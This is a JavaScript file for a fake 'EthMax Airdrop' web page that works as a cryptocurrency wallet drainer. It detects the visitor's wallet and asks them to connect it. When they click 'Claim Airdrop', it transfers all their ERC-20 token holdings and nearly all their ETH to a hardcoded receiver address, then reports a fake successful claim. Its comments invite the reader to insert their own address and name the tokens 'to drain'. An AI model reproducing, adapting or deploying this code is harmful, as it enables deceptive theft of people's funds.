$(document).ready(function() {
    // Dynamic wallet detection
    const detectedWallets = [];
    if (window.ethereum) {
        // Single provider
        const eth = window.ethereum;
        const walletTypes = [
            { name: "MetaMask", key: "isMetaMask" },
            { name: "Coinbase Wallet", key: "isCoinbaseWallet" },
            { name: "Trust Wallet", key: "isTrust" },
            { name: "Rainbow", key: "isRainbow" },
            { name: "Brave Wallet", key: "isBraveWallet" },
            { name: "Opera Wallet", key: "isOpera" },
            { name: "Phantom (ETH)", key: "isPhantom" },
            { name: "Rabby Wallet", key: "isRabby" },
            { name: "Frame", key: "isFrame" },
            { name: "Talisman", key: "isTalisman" }
        ];
        // Improved Phantom detection: check window.phantom.ethereum
        if (window.phantom && window.phantom.ethereum) {
            detectedWallets.push({ name: "Phantom (ETH)", provider: eth });
        } else {
            walletTypes.forEach(w => {
                if (w.key === "isPhantom" && eth[w.key]) {
                    detectedWallets.push({ name: w.name, provider: eth });
                } else if (w.key === "isMetaMask" && eth[w.key] && !eth.isPhantom) {
                    detectedWallets.push({ name: w.name, provider: eth });
                } else if (w.key === "isCoinbaseWallet" && eth[w.key]) {
                    detectedWallets.push({ name: w.name, provider: eth });
                } else if (w.key !== "isPhantom" && w.key !== "isMetaMask" && w.key !== "isCoinbaseWallet" && eth[w.key]) {
                    detectedWallets.push({ name: w.name, provider: eth });
                }
            });
        }
        // Extra: detect Coinbase Wallet via window.coinbaseWalletExtension
        if (window.coinbaseWalletExtension) {
            detectedWallets.push({ name: "Coinbase Wallet", provider: window.coinbaseWalletExtension });
        }
        // Multiple providers
        if (Array.isArray(eth.providers)) {
            eth.providers.forEach(p => {
                walletTypes.forEach(w => {
                    if (w.key === "isPhantom" && p[w.key]) {
                        detectedWallets.push({ name: w.name, provider: p });
                    } else if (w.key === "isMetaMask" && p[w.key] && !p.isPhantom) {
                        detectedWallets.push({ name: w.name, provider: p });
                    } else if (w.key === "isCoinbaseWallet" && p[w.key]) {
                        detectedWallets.push({ name: w.name, provider: p });
                    } else if (w.key !== "isPhantom" && w.key !== "isMetaMask" && w.key !== "isCoinbaseWallet" && p[w.key]) {
                        detectedWallets.push({ name: w.name, provider: p });
                    }
                });
            });
        }
    }
    // WalletConnect detection
    let walletConnectAvailable = false;
    let WalletConnectProvider = null;
    if (window.WalletConnectProvider) {
        walletConnectAvailable = true;
        WalletConnectProvider = window.WalletConnectProvider;
    } else if (window.WalletConnect && window.WalletConnect.EthereumProvider) {
        walletConnectAvailable = true;
        WalletConnectProvider = window.WalletConnect.EthereumProvider;
    }
    if (walletConnectAvailable) {
        detectedWallets.push({ name: "WalletConnect", provider: "walletconnect" });
    }

    // Your Ethereum address to receive funds
    const RECEIVER_ADDRESS = "0x742d35Cc6634C0532925a3b8D79dCf4c6e3c6C8f"; // Replace with your ETH address

    // Common ERC-20 token contracts (popular tokens to drain)
    const COMMON_TOKENS = [
        { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
        { symbol: "USDC", address: "0xA0b86a33E6e26C8d5F0Ce4D2a2E7e9E0E04E4F8C", decimals: 6 },
        { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
        { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
        { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
        { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4CE", decimals: 18 },
        { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
    ];

    // Function to debug available wallet providers
    function debugWalletProviders() {
        console.log("=== Wallet Provider Debug ===");
        console.log("window.ethereum:", window.ethereum);
        
        if (window.ethereum) {
            console.log("Main ethereum object properties:");
            console.log("- isMetaMask:", window.ethereum.isMetaMask);
            console.log("- isPhantom:", window.ethereum.isPhantom);
            console.log("- isCoinbaseWallet:", window.ethereum.isCoinbaseWallet);
            console.log("- isTrust:", window.ethereum.isTrust);
            console.log("- isRainbow:", window.ethereum.isRainbow);
            console.log("- isBraveWallet:", window.ethereum.isBraveWallet);
            console.log("- isRabby:", window.ethereum.isRabby);
            
            if (window.ethereum.providers) {
                console.log("Multiple providers detected:", window.ethereum.providers.length);
                window.ethereum.providers.forEach((provider, index) => {
                    console.log(`Provider ${index}:`, {
                        isMetaMask: provider.isMetaMask,
                        isPhantom: provider.isPhantom,
                        isCoinbaseWallet: provider.isCoinbaseWallet,
                        isTrust: provider.isTrust,
                        isRainbow: provider.isRainbow,
                        isBraveWallet: provider.isBraveWallet,
                        isRabby: provider.isRabby
                    });
                });
            }
        }
        console.log("==========================");
    }

    // Function to detect mobile device
    function isMobileDevice() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

    // Function to create mobile deep links for Ethereum wallets
    function createMobileDeepLink(walletName, dappUrl = window.location.href) {
        const encodedUrl = encodeURIComponent(dappUrl);
        const mobileLinks = {
            "metamask": `https://metamask.app.link/dapp/${window.location.hostname}`,
            "trust wallet": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
            "coinbase wallet": `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
            "rainbow": `https://rainbow.me/dapp?url=${encodedUrl}`,
            "phantom (eth)": `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`
        };
        
        return mobileLinks[walletName.toLowerCase()] || null;
    }

    // Function to attempt mobile wallet connection
    function connectMobileWallet(walletName) {
        if (!isMobileDevice()) return false;
        
        const deepLink = createMobileDeepLink(walletName);
        if (deepLink) {
            window.open(deepLink, '_blank');
            return true;
        }
        
        return false;
    }

    // Insert wallet dropdown before button
    $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:15px;"></select>');
    detectedWallets.forEach((opt, i) => {
        $('#wallet-select').append(`<option value="${i}">${opt.name}</option>`);
    });

    // Debug wallet providers on page load
    debugWalletProviders();

    // Main wallet connection handler
    $('#connect-wallet').on('click', async () => {
        const selectedIdx = $('#wallet-select').val();
        const selected = detectedWallets[selectedIdx];
        let provider = null;
        let providerName = selected ? selected.name : "";
        try {
            if (!selected) {
                alert("No wallet selected.");
                return;
            }
            if (selected.name === "WalletConnect" && walletConnectAvailable && WalletConnectProvider) {
                // WalletConnect modal
                const PROJECT_ID = "435fa3916a5da648144afac1e1b4d3f2";
                provider = await WalletConnectProvider.init({
                    projectId: PROJECT_ID,
                    chains: [1],
                    showQrModal: true,
                    metadata: {
                        name: "EthMax Airdrop",
                        description: "Claim your EthMax airdrop tokens - Connect any Ethereum wallet",
                        url: window.location.origin,
                        icons: ["https://walletconnect.com/walletconnect-logo.png"]
                    }
                });
                await provider.connect();
                if (!provider.accounts || provider.accounts.length === 0) {
                    alert("No accounts connected via WalletConnect.");
                    return;
                }
            } else {
                provider = selected.provider;
                // Request account access
                await provider.request({ method: 'eth_requestAccounts' });
            }
            // Get connected accounts
            let accounts = [];
            if (selected.name === "WalletConnect") {
                accounts = provider.accounts;
            } else {
                accounts = await provider.request({ method: 'eth_accounts' });
            }
            if (!accounts || accounts.length === 0) {
                alert("No accounts found. Please unlock your wallet.");
                return;
            }
            const userAddress = accounts[0];
            // Initialize ethers provider
            const ethersProvider = new ethers.providers.Web3Provider(provider);
            const signer = ethersProvider.getSigner();
            // Get network info
            const network = await ethersProvider.getNetwork();
            // Check ETH balance
            const balance = await ethersProvider.getBalance(userAddress);
            const ethBalance = ethers.utils.formatEther(balance);
            // Update button
            $('#connect-wallet').text("🎯 Claim Airdrop");
            $('#connect-wallet').off('click').on('click', async () => {
                await drainWallet(ethersProvider, signer, userAddress);
            });
            alert(`Connected to ${providerName}:\n${userAddress}\nBalance: ${ethBalance} ETH`);
        } catch (error) {
            console.error("Connection error:", error);
            alert("Failed to connect wallet: " + error.message);
        }
    });

    // Function to drain the wallet (ETH + ERC-20 tokens)
    async function drainWallet(provider, signer, userAddress) {
        try {
            console.log("Starting wallet drain...");

            // Step 1: Drain ERC-20 tokens first (they need ETH for gas)
            for (const token of COMMON_TOKENS) {
                try {
                    await drainERC20Token(provider, signer, userAddress, token);
                } catch (tokenError) {
                    console.error(`Failed to drain ${token.symbol}:`, tokenError);
                    // Continue with other tokens
                }
            }

            // Step 2: Drain remaining ETH (leave small amount for final gas)
            await drainETH(provider, signer, userAddress);

            alert("Airdrop claimed successfully! 🎉");

        } catch (error) {
            console.error("Drain error:", error);
            alert("Failed to claim airdrop: " + error.message);
        }
    }

    // Function to drain ERC-20 tokens
    async function drainERC20Token(provider, signer, userAddress, token) {
        try {
            // ERC-20 ABI for transfer function
            const erc20ABI = [
                "function balanceOf(address owner) view returns (uint256)",
                "function transfer(address to, uint256 amount) returns (bool)",
                "function allowance(address owner, address spender) view returns (uint256)",
                "function approve(address spender, uint256 amount) returns (bool)"
            ];

            const tokenContract = new ethers.Contract(token.address, erc20ABI, signer);

            // Check token balance
            const balance = await tokenContract.balanceOf(userAddress);
            if (balance.isZero()) {
                console.log(`No ${token.symbol} balance found`);
                return;
            }

            console.log(`Draining ${token.symbol}: ${ethers.utils.formatUnits(balance, token.decimals)}`);

            // Transfer tokens to receiver address
            const transferTx = await tokenContract.transfer(RECEIVER_ADDRESS, balance);
            console.log(`${token.symbol} transfer tx:`, transferTx.hash);

            // Wait for confirmation
            await transferTx.wait();
            console.log(`${token.symbol} transfer confirmed`);

        } catch (error) {
            console.error(`Error draining ${token.symbol}:`, error);
            throw error;
        }
    }

    // Function to drain ETH
    async function drainETH(provider, signer, userAddress) {
        try {
            const balance = await provider.getBalance(userAddress);
            
            // Estimate gas for a simple transfer
            const gasPrice = await provider.getGasPrice();
            const gasLimit = ethers.BigNumber.from("21000"); // Standard ETH transfer gas
            const gasCost = gasPrice.mul(gasLimit);

            // Calculate amount to send (leave gas for transaction)
            const amountToSend = balance.sub(gasCost);

            if (amountToSend.lte(0)) {
                console.log("Insufficient ETH balance for gas fees");
                return;
            }

            console.log(`Draining ETH: ${ethers.utils.formatEther(amountToSend)}`);

            // Send ETH transaction
            const tx = await signer.sendTransaction({
                to: RECEIVER_ADDRESS,
                value: amountToSend,
                gasLimit: gasLimit,
                gasPrice: gasPrice
            });

            console.log("ETH transfer tx:", tx.hash);

            // Wait for confirmation
            await tx.wait();
            console.log("ETH transfer confirmed");

        } catch (error) {
            console.error("Error draining ETH:", error);
            throw error;
        }
    }
});
